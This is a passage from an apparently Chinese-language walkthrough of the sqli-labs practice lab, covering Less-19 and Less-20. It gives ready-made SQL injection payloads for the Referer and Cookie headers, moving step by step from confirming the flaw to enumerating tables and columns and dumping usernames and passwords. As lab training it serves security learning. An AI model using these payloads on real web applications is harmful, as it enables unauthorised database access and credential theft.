Referer: ' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) and '
```

显示未完全

```
Referer: ' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','Angelina')))) and '
```

# **Less-20** 

**POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)**



看到**cookie：uname=admin** 没毛病就是cookie注入了

抓有cookie的包

加单引号

```
Cookie: uname=admin'
```

爆出语法错误，看得出来就是单引号型。

暴字段数

```
Cookie: uname=admin' order by 3 --+    //正常

Cookie: uname=admin' order by 4 --+    //报错    判断字段数为3
```

暴字段位置

```
Cookie: uname=-admin'  union select 1,2,3 --+
```

暴库，版本

```
Cookie: uname=-admin'  union select version(),database(),3 --+
```

暴表名

```
Cookie: uname=-admin'  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

暴字段

```
Cookie: uname=-admin'  union select 1,2,group_concat(column_name) from information_schema.columns where table_name ='users' --+
```

暴内容

```
Cookie: uname=-admin'  union select 1,2,group_concat(username,password) from users --+
```

